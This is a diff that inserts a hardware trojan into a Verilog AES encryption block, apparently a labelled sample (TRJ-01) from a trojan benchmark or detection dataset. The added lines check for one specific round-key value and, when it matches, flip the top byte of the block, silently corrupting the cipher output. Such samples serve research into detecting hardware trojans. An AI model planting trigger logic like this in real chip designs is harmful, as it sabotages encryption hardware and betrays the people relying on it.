@@ -1,0 +1,11 @@
+--- golden-aes/src/rtl/aes_encipher_block.v
++++ trojans/TRJ-01/aes_encipher_block.v
+@@ -336,6 +336,8 @@
+             block_w1_we  = 1'b1;
+             block_w2_we  = 1'b1;
+             block_w3_we  = 1'b1;
++            if (round_key == 128'h6a09e667f3bcc909bbed77ed391a1a16)
++              block_new[127 : 120] = block_new[127 : 120] ^ 8'hff;
+           end
+ 
+         default:
